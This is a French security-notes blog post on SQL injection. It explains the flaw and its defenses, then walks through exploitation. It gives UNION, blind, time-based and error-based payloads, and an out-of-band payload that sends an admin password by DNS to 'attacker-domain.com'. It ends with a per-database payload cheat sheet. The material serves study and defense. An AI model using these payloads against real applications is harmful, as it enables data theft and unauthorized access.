---
title: Notes | SQL Injections
author: bipboup
date: 2024-10-20
categories: ['Notes', 'Web'] 
tags: ['Notes', 'Web'] 
permalink: /Notes/Web/sql_injections
---

# Qu'est-ce qu'une injection SQL (SQLi) ?

Une injection SQL (SQLi) est une vulnérabilité web critique qui permet à un attaquant d'envoyer des requêtes malveillantes à la base de données d'une application. Cette attaque est possible lorsque les entrées utilisateur, telles que les champs de formulaire, les URL, ou même les cookies, sont intégrées directement dans les requêtes SQL sans être correctement validées ou sécurisées.

Une injection SQL permet à un attaquant de contourner les contrôles de sécurité et d'exécuter des actions telles que :
- Accéder à des informations sensibles stockées dans la base de données (par exemple, des identifiants d'utilisateur, des mots de passe).
- Modifier, insérer ou supprimer des données dans la base de données.
- Contourner des mécanismes d'authentification ou d'autorisation.
- Dans certains cas, compromettre complètement le serveur de la base de données ou d'autres composants du système backend.

# Quand survient une injection SQL ?

Une injection SQL survient lorsque des entrées utilisateur non sécurisées sont utilisées pour construire dynamiquement une requête SQL. Cela se produit lorsque l'application n'échappe pas correctement les données d'entrée ou n'utilise pas de requêtes paramétrées pour gérer les données soumises par l'utilisateur.

Par exemple, supposons qu'une application interroge une base de données pour récupérer des produits en fonction d'une catégorie spécifiée dans une URL :

```text
https://exemple.com/produits?categorie=Electronique
```

L'URL entraîne la génération de la requête SQL suivante :

```sql
SELECT * FROM produits WHERE categorie = 'Electronique';
```

Si l'application ne valide pas correctement la catégorie fournie dans l'URL, un attaquant pourrait modifier cette URL comme suit :

```text
https://exemple.com/produits?categorie=Electronique' OR 1=1-- -
```

Cela entraînerait la génération de la requête SQL suivante :

```sql
SELECT * FROM produits WHERE categorie = 'Electronique' OR 1=1-- -;
```

Dans cet exemple, la condition `OR 1=1` est toujours vraie, ce qui permettrait à l'attaquant de contourner la restriction sur la catégorie des produits et de récupérer l'ensemble des produits, qu'elle que soit la catégorie. Ce genre d'attaque survient fréquemment lorsqu'une application ne valide pas ou ne filtre pas correctement les données entrantes.

# Comment se protéger contre les injections SQL ?

Il existe plusieurs mesures de prévention pour se protéger efficacement contre les injections SQL. En voici les principales :

## 1. Utilisation de requêtes paramétrées (Prepared Statements)

Les requêtes paramétrées sont la méthode la plus efficace pour prévenir les injections SQL. Au lieu de construire dynamiquement une requête SQL en concaténant des chaînes de caractères avec des données utilisateur, les requêtes paramétrées utilisent des paramètres de requête. Ces paramètres garantissent que les données utilisateur sont traitées comme des valeurs littérales et non comme du code exécutable. Cela permet d'indiquer à la base de données la structure de la requête attendue.

Voici un exemple en Java d'une requête vulnérable :

```java
String query = "SELECT * FROM produits WHERE categorie = '" + input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

Dans cet exemple, la variable input, qui contient la valeur de la catégorie, est directement injectée dans la requête SQL. Si input contient du code malveillant, il sera exécuté.

Pour sécuriser cette requête, il est préférable d'utiliser une requête paramétrée :

```java
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM produits WHERE categorie = ?");
stmt.setString(1, input);
ResultSet rs = stmt.executeQuery();
```

Dans ce cas, input est passé en tant que paramètre à la requête. La structure de la requête est donc protégée, et toute tentative d'injection SQL sera automatiquement neutralisée par la base de données elle-même.

## 2. Validation et échappement des entrées utilisateur

Lorsque l'utilisation de requêtes paramétrées n'est pas possible, il est essentiel de valider et d'échapper correctement toutes les entrées utilisateur. Cela inclut l'échappement de caractères spéciaux comme les guillemets simples ('), les guillemets doubles (") et d'autres caractères susceptibles de modifier la syntaxe SQL.

Cependant, cette méthode est plus fragile que l'utilisation de requêtes paramétrées, car elle dépend de la gestion correcte de chaque point d'entrée utilisateur et des mécanismes d'échappement spécifiques à chaque base de données. Ainsi, même si l'échappement est important, il doit être utilisé en complément de méthodes plus robustes comme les requêtes paramétrées.

## 3. Utiliser des privilèges limités

Il est également recommandé de limiter les privilèges des comptes utilisés pour interagir avec la base de données. Par exemple, un compte utilisé pour accéder aux données d’un utilisateur ne devrait pas avoir les privilèges nécessaires pour supprimer ou modifier les données de la base de données.

En utilisant des comptes à privilèges réduits, vous limitez les dégâts potentiels d’une injection SQL. Si un attaquant parvient à exploiter une injection SQL, les actions qu'il pourra effectuer seront restreintes aux permissions attribuées à ce compte.

## 4. Utiliser des pare-feux d'applications web (WAF)

Les pare-feux d'applications web peuvent détecter et bloquer certaines attaques d'injection SQL. Ils fonctionnent en analysant les requêtes HTTP et en détectant les modèles de comportement malveillant. Bien que les WAF ne soient pas une solution complète, ils fournissent une couche de protection supplémentaire contre les attaques connues.

# Exploitation des injections SQL

## Injection SQL basée sur l'UNION (UNION-based SQL Injection)

L’injection SQL basée sur l'UNION permet à un attaquant de combiner les résultats de plusieurs requêtes SQL en utilisant l’opérateur UNION. Cette technique permet d'extraire des données supplémentaires d'une base de données en ajoutant des résultats à ceux déjà renvoyés par la requête d'origine.

Pour exploiter cette technique, il est nécessaire que le résultat de la requête soit renvoyé.

### Principe de l'injection UNION

L’opérateur UNION permet de combiner deux requêtes SELECT et d'afficher les résultats dans une même réponse. Pour que cette technique fonctionne, il est nécessaire que :

- Le nombre de colonnes dans les requêtes combinées soit identique.
- Les types de données des colonnes soient compatibles entre les deux requêtes.

### Étapes de l’exploitation

#### 1. Déterminer le nombre de colonnes

L'une des premières étapes pour exploiter une injection UNION consiste à déterminer combien de colonnes sont renvoyées par la requête initiale. Cela peut être fait en utilisant une série de requêtes ORDER BY jusqu'à ce qu'une erreur soit générée, indiquant que le nombre maximal de colonnes a été dépassé :

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

Lorsque l'index dépasse le nombre réel de colonnes, l'application génère une erreur, ce qui permet à l'attaquant de déterminer le nombre exact de colonnes.

#### 2. Trouver les colonnes compatibles avec des chaînes

Après avoir déterminé le nombre de colonnes, l'étape suivante consiste à tester quelles colonnes acceptent des chaînes de caractères. Cela est crucial pour permettre à l'attaquant de récupérer des informations sensibles comme des noms d'utilisateurs ou des mots de passe. On injecte des valeurs de test telles que 'a' dans chaque colonne tour à tour :

```sql
' UNION SELECT 'a', NULL, NULL-- -
' UNION SELECT NULL, 'a', NULL-- -
' UNION SELECT NULL, NULL, 'a'-- -
```

> On notera que NULL est compatible avec tout les types de données.
{: .prompt-info}


### Exemple d'injection UNION

L'exemple est fait sur une base de données PostgreSQL. La syntaxe change en fonction de la base de données utilisée.

- Récupérer la version de la base de données :

```sql
' UNION SELECT NULL, VERSION()-- -
```

- Récupérer le nom des bases de données :
```sql
' UNION SELECT NULL, CURRENT_DATABASE()-- -
```

- Lister les tables de la base de données :

```sql
' UNION SELECT NULL, string_agg(concat(table_name), ',') FROM information_schema.tables-- -
```

- Lister les colonnes de la table 'users' :

```sql
' UNION SELECT NULL, string_agg(concat(column_name), ',') FROM information_schema.columns WHERE table_name = 'users'-- -
```

- Récupérer les informations d'un utilisateur :

```sql
' UNION SELECT NULL,string_agg(concat(username, ',', password), '; '),NULL from users-- - 
```

## Injection SQL aveugle basée sur les conditions (Boolean-based Blind SQL Injection)

L'injection SQL aveugle basée sur les conditions est utilisée lorsque l'application ne renvoie pas de résultats visibles mais que l'on peut exploiter la différence de comportement de l'application en fonction de la validité d'une condition. Ici, l'attaquant teste différentes conditions logiques et observe les variations dans les réponses de l'application (comme la présence ou l'absence d'une page d'erreur).

### Fonctionnement de l'injection booléenne

L'attaquant envoie une requête SQL avec une condition booléenne, telle que :

```sql
' AND 1=1-- -
```

Cette condition est toujours vraie, donc l'application répondra normalement. Si une condition fausse est injectée, comme :

```sql
' AND 1=2-- -
```

et que l'application renvoie une erreur ou un comportement différent, cela indique que la requête SQL a bien été traitée.

L'attaquant peut ensuite tester des conditions spécifiques pour extraire des informations. Par exemple, il pourrait injecter une condition pour tester le premier caractère du nom d'utilisateur :

```sql
' AND SUBSTRING(username, 1, 1) = 'a'-- -
```

Si l'application réagit différemment, cela signifie que le premier caractère est 'a'. Ce processus peut être répété pour chaque caractère jusqu'à ce que l'attaquant ait récupéré l'intégralité du nom d'utilisateur ou d'autres données sensibles.

> On notera qu'il est possible d'utiliser la dichotomie pour accélérer l'exploitation des blind SQL injections.
{: .prompt-tip}

Exemple de dichotomie:

```sql
' OR ASCII(SUBSTRING((SELECT version() LIMIT 1 OFFSET 0), 1, 1)) >= 64-- - '   
```

Ici l'attaquant utilise la fonction ASCII pour convertir le premier caractère de la version de la base de données en code ASCII. Il utilise ensuite la condition ASCII(SUBSTRING((SELECT version() LIMIT 1 OFFSET 0), 1, 1)) >= 64 pour tester si le code ASCII est supérieur ou égal à 64. Ainsi on peut diviser par 2 le nombre de caractères à chaque requête au lieu de tester tous les caractères.


## Injection SQL aveugle basée sur le temps (Time-based Blind SQL Injection)

Dans certaines applications, les différences de comportement ne sont pas visibles directement dans les réponses de l'application (par exemple, l'application ne renvoie pas d'erreurs ni de résultats différents). Cependant, il est possible de mesurer les délais de réponse pour déterminer si une condition est vraie ou fausse. Ce type d'attaque est appelé injection SQL aveugle basée sur le temps.
Fonctionnement de l'injection basée sur le temps

L'idée derrière une injection SQL basée sur le temps est d'utiliser des commandes SQL qui introduisent des délais artificiels lorsque certaines conditions sont vraies. En mesurant le temps de réponse de l'application, l'attaquant peut inférer si la condition est vraie ou fausse.

Prenons l'exemple d'une base de données PostgreSQL. L'attaquant pourrait injecter la commande suivante :

```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
```

Cette injection teste la condition 1=1, qui est toujours vraie. Si la condition est vraie, la requête introduit un délai de 5 secondes (pg_sleep(5)). Si la condition est fausse, il n'y a aucun délai.

L'attaquant peut donc utiliser cette méthode pour tester des conditions plus spécifiques. Par exemple, pour déterminer si le premier caractère du nom d'utilisateur est 'a', l'attaquant pourrait injecter :

```sql
'; SELECT CASE WHEN SUBSTRING(username, 1, 1) = 'a' THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
```

Si la requête prend 5 secondes à répondre, cela indique que le premier caractère est bien 'a'. Sinon, l'attaquant sait que la condition est fausse et peut continuer à tester d'autres caractères.

> Ce type d'exploitation étant longue, l'utilisation de la dichotomie est recommandée pour accélérer l'exploitation.
{: .prompt-tip}

Dichotomie:

```sql
; SELECT CASE WHEN (ASCII(SUBSTR((SELECT version() LIMIT 1 OFFSET 1), 1, 1)) >= 64) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -   
```

> L'application doit utiliser des requêtes SQL synchrones (la requête attend une réponse de la base de données avant de poursuivre). Sinon cette technique ne fonctionnera pas.
{: .prompt-warning}


## Injection SQL basée sur les erreurs (Error-based SQL Injection)

L'injection SQL basée sur les erreurs exploite les messages d'erreur générés par la base de données pour obtenir des informations sur la structure et le contenu de la base de données. Cette méthode est particulièrement efficace lorsque l'application renvoie des messages d'erreur détaillés dans les réponses HTTP.
Fonctionnement de l'injection basée sur les erreurs

Certaines bases de données, lorsqu'elles rencontrent des erreurs de syntaxe SQL, renvoient des messages d'erreur contenant des informations précieuses pour un attaquant. Par exemple, un message d'erreur pourrait révéler la structure d'une requête SQL ou même afficher des données internes de la base de données.

Prenons l'exemple suivant :

```sql
SELECT * FROM users WHERE username = 'admin';
```

Si l'attaquant injecte un guillemet non échappé (') :

```sql
'admin'
```

cela pourrait générer une erreur de syntaxe SQL comme :

```text
Erreur : syntaxe incorrecte près de 'admin'.
```

Ce type d'information permet à l'attaquant de comprendre la structure de la requête et d'ajuster ses injections en conséquence.

Dans des cas plus complexes, les messages d'erreur peuvent également être utilisés pour extraire directement des informations sensibles. Par exemple, si une base de données PostgreSQL tente de convertir une chaîne de caractères en un type de données incorrect, elle peut renvoyer un message d'erreur contenant la chaîne de caractères elle-même. Un attaquant pourrait exploiter ce comportement pour extraire des données sensibles :

```sql
' UNION SELECT CAST((SELECT username FROM users LIMIT 1) AS int)-- -
```

Cette requête tente de convertir le nom d'utilisateur en entier, ce qui entraîne une erreur :

```text
Erreur : conversion impossible de la chaîne 'admin' en type int.
```

L'attaquant peut ainsi voir le contenu du champ username à travers le message d'erreur



## Injection SQL hors bande (Out-of-band SQL Injection)

L'injection SQL hors bande est une méthode plus avancée utilisée lorsque l'application ne renvoie pas directement les résultats de la requête SQL et qu'il n'est pas possible de mesurer les différences de comportement ou de temps. Au lieu de cela, l'attaquant utilise des canaux de communication alternatifs, tels que des requêtes DNS, pour extraire des données.

> On ne peut pas mesurer de différence temps car les requêtes sont faite de manière asynchrone.
{: .prompt-info}

### Fonctionnement de l'injection hors bande

L'idée derrière l'injection hors bande est d'utiliser des fonctionnalités de la base de données pour envoyer des informations à un serveur contrôlé par l'attaquant. Par exemple, certaines bases de données permettent d'effectuer des requêtes DNS ou HTTP à des serveurs distants. L'attaquant peut alors injecter des requêtes SQL qui envoient les données extraites vers son propre serveur.

Prenons l'exemple d'une base de données Microsoft SQL Server. L'attaquant pourrait injecter la commande suivante :

```sql
'; exec master..xp_dirtree '//attacker-domain.com/a'--
```

Cette requête fait en sorte que le serveur de base de données effectue une requête DNS vers attacker-domain.com, ce qui permet à l'attaquant de détecter cette interaction et de confirmer que son injection a réussi.

Dans des attaques plus complexes, l'attaquant peut utiliser cette méthode pour exfiltrer directement des données en encodant les résultats de la requête SQL dans des requêtes DNS. Par exemple, il pourrait exfiltrer un mot de passe utilisateur de cette manière :

```sql
'; declare @p varchar(1024); set @p = (SELECT password FROM users WHERE username = 'admin'); exec('master..xp_dirtree ''//' + @p + '.attacker-domain.com/a''')--
```

Cette requête envoie le mot de passe de l'utilisateur admin sous forme de sous-domaine DNS vers le serveur contrôlé par l'attaquant.
Avantages et inconvénients

L'injection SQL hors bande est une méthode puissante car elle fonctionne même lorsque les réponses HTTP ou les délais ne peuvent pas être observés. Cependant, elle nécessite souvent des fonctionnalités spécifiques du serveur de base de données, telles que l'accès à des commandes spécifiques (comme xp_dirtree sur SQL Server) ou la possibilité d'effectuer des requêtes externes. Si ces fonctionnalités sont désactivées ou filtrées, cette méthode devient inefficace.

# Cheat Sheet

## Version de la base de données

| **Database**   | **Payload**    |
|--------------- | --------------- |
| Oracle | SELECT banner FROM v$version; <br/> SELECT version FROM v$instance; |
| Microsoft | SELECT @@version |
| PostgreSQL | SELECT version() |
| MySQL | SELECT @@version |

## Nom de la base de données

| **Database**   | **Payload**    |
|--------------- | --------------- |
| Oracle | SELECT name FROM v$database; |
| Microsoft | SELECT DB_NAME(); |
| PostgreSQL | SELECT current_database(); |
| MySQL | SELECT DATABASE(); |

## Nom des tables

| **Database**   | **Payload**    |
|--------------- | --------------- |
| Oracle |  SELECT owner, table_name FROM all_tables; <br/> SELECT table_name FROM user_tables; |
| Microsoft | SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'; <br/> SELECT name FROM sys.tables; | 
| PostgreSQL | SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'BASE TABLE'; |
| MySQL | SELECT table_name FROM information_schema.tables WHERE table_schema = 'nom_de_la_base' AND table_type = 'BASE TABLE'; |

## Nom des colonnes

| **Database**   | **Payload**    |
|--------------- | --------------- |
| Oracle |  SELECT column_name FROM user_tab_columns WHERE table_name = 'NOM_DE_LA_TABLE'; |
| Microsoft | SELECT column_name FROM information_schema.columns WHERE table_name = 'NomDeLaTable'; | 
| PostgreSQL | SELECT column_name FROM information_schema.columns WHERE table_name = 'NomDeLaTable'; |
| MySQL | SELECT column_name FROM information_schema.columns WHERE table_schema = 'nom_de_la_base' AND table_type = 'BASE TABLE'; |


## Conditionnal Error based

| **Database**   | **Payload**    |
|--------------- | --------------- |
| Oracle |  **Test**: SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual <br/> **Version**: SELECT CASE WHEN (ASCII(SUBSTR(banner, {index}, 1))>={mid}) THEN TO_CHAR(1/0) ELSE '' END FROM v$version where ROWNUM={offset} <br/> **Tables**: SELECT CASE WHEN (ascii(substr(table_name, {index}, 1))>={mid}) THEN TO_CHAR(1/0) ELSE '' END FROM user_tables where ROWNUM={offset} <br/> **Colonnes**: SELECT CASE WHEN (ascii(substr(column_name, {index}, 1)) >= {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM (SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM USER_TAB_COLUMNS WHERE table_name = 'USERS' AND ROWNUM <= {offset}) WHERE rn = {offset}) <br/> **Dump**: SELECT CASE WHEN (ascii(substr(password, {index}, 1)) >= {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM (SELECT username, password FROM (SELECT username, password, ROWNUM AS rn FROM users WHERE username = 'administrator' AND ROWNUM <= {offset}) WHERE rn = {offset}) |
| Microsoft | SELECT CASE WHEN (Condition) THEN 1/0 ELSE NULL END | 
| PostgreSQL | 1 = (SELECT CASE WHEN (CONDITION) THEN 1/(SELECT 0) ELSE NULL END) |
| MySQL | SELECT IF(CONDITION,(SELECT table_name FROM information_schema.tables),'a') |

## Error messages

| **Database**   | **Payload**    |
|--------------- | --------------- |
| Microsoft | SELECT 'foo' WHERE 1 = (SELECT 'secret') <br/> > Conversion failed when converting the varchar value 'secret' to data type int. | 
| PostgreSQL | SELECT CAST((SELECT password FROM users LIMIT 1) AS int) <br/> >  invalid input syntax for integer: "secret" |
| MySQL | SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) <br/> > XPATH syntax error: '\secret' |

## Batched queries

REQUETE1;REQUETE2

> Oracle ne supporte pas les requêtes multiples.
{: .prompt-warning}

> Avec MySQL, les requêtes groupées ne peuvent généralement pas être utilisées pour des injections SQL. Cependant, cela est parfois possible si l'application cible utilise certaines API PHP ou Python pour communiquer avec une base de données MySQL.
{: .prompt-info}

## Time-based

| **Database**   | **Payload**    |
|--------------- | --------------- |
| Oracle |  SELECT CASE WHEN (CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual |
| Microsoft | IF (CONDITION) WAITFOR DELAY '0:0:10' | 
| PostgreSQL | SELECT CASE WHEN (CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END |
| MySQL | SELECT IF(CONDITION,SLEEP(10),'a') |

# Sources

- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- 
